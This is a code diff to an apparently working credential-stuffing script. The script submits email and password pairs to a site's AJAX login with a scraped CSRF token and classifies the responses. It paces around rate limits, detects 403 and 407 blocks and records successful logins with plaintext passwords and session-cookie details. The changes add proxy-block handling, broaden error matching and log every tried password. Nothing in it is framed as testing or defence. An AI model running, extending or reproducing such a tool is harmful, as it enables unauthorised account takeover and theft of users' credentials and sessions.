@@ -190,7 +190,7 @@ function paceDelay() {
   let csrf = await ev(`(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);
   rec({ event: 'csrf', len: (csrf || '').length });
 
-  let validated = 0, success = 0, unable = 0, link = 0, closed = 0, unknown = 0, r429 = 0, r403 = 0, tokFail = 0, posted = 0;
+  let validated = 0, success = 0, unable = 0, link = 0, closed = 0, unknown = 0, r429 = 0, r403 = 0, r407 = 0, tokFail = 0, posted = 0;
   const successes = [], msAll = [], tokAll = [], postAll = [];
   let blocked = false;
 
@@ -232,21 +232,22 @@ function paceDelay() {
       let js = null; try { js = JSON.parse(r.body || 'null'); } catch (e) {}
 
       if (r.status === 429) { r429++; rec({ event: 'r429', at: i + 1, posted }); await sleep(13000); continue; }
-      if (r.status === 403) {
-        r403++;
-        rec({ event: 'r403', at: i + 1, posted, body: (r.body || '').slice(0, 60) });
+      if (r.status === 403 || r.status === 407) {
+        if (r.status === 403) r403++; else r407++;
+        rec({ event: r.status === 403 ? 'r403' : 'r407', at: i + 1, posted, body: (r.body || '').slice(0, 60) });
         blocked = true;
         break;
       }
 
+      const text = (js && (js.errors || []).join(' ')) || (r.body || '');
       const isSuccess = !!(js && js.success === true);
-      const isInvalid = !!(js && js.error_fields && js.error_fields.indexOf('password') >= 0 && /incorrect/i.test((js.errors || []).join(' ')));
-      const isUnable = !!(js && /unable to log you in/i.test((js.errors || []).join(' ')));
-      const isLink = !!(js && (js.require_link || js.magic_link) && !isSuccess);
-      const isClosed = !!(js && /has been closed/i.test((js.errors || []).join(' ')));
+      const isClosed = /has been closed/i.test(text);
+      const isInvalid = !!(js && js.error_fields && js.error_fields.indexOf('password') >= 0 && /incorrect/i.test(text));
+      const isUnable = /unable to log you in/i.test(text);
+      const isLink = !!(js && (js.require_link || js.magic_link) && !isSuccess) || /login link|magic link/i.test(text);
 
-      if (isSuccess) success++; else if (isInvalid) validated++; else if (isUnable) unable++;
-      else if (isLink) link++; else if (isClosed) closed++; else unknown++;
+      if (isSuccess) success++; else if (isClosed) closed++; else if (isInvalid) validated++;
+      else if (isUnable) unable++; else if (isLink) link++; else unknown++;
 
       let profileStatus = null, zss = null;
       if (isSuccess) {
@@ -257,7 +258,8 @@ function paceDelay() {
         zss = all.filter(x => x.name === 'zss').map(x => ({ d: x.domain, len: (x.value || '').length }));
         successes.push({ email: c.email, pass: c.pass, profileStatus, zss });
       }
-      rec({ i: i + 1, email: c.email, status: r.status, success: isSuccess, validated: isInvalid, unable: isUnable, link: isLink, closed: isClosed, tokLen: String(tok || '').length, tokMs, postMs, body: (r.body || '').slice(0, 110), profileStatus, zss: zss ? zss.length : 0, ms: tokMs + postMs });
+      const zssLen = zss && zss.length ? Math.max(...zss.map(x => x.len)) : 0;
+      rec({ i: i + 1, email: c.email, pass: c.pass, status: r.status, success: isSuccess, validated: isInvalid, unable: isUnable, link: isLink, closed: isClosed, tokLen: String(tok || '').length, tokMs, postMs, body: (r.body || '').slice(0, 110), profileStatus, zss: zss ? zss.length : 0, zssLen, ms: tokMs + postMs });
       fin = true;
 
       if (isSuccess) {
@@ -273,7 +275,7 @@ function paceDelay() {
 
   const avg = a => a.length ? Math.round(a.reduce((x, y) => x + y, 0) / a.length) : 0;
   rec({ event: 'summary', mode: 'fast', processed: msAll.length, posted, validated, success, unable, link, closed, unknown,
-        r429, r403, tokFail, blocked, paceSleepMs, avgTokMs: avg(tokAll), avgPostMs: avg(postAll), avgMs: avg(msAll),
+        r429, r403, r407, tokFail, blocked, paceSleepMs, avgTokMs: avg(tokAll), avgPostMs: avg(postAll), avgMs: avg(msAll),
         secs: Math.round((Date.now() - t0) / 1000), successes });
 
   try { ws.close(); } catch (e) {}
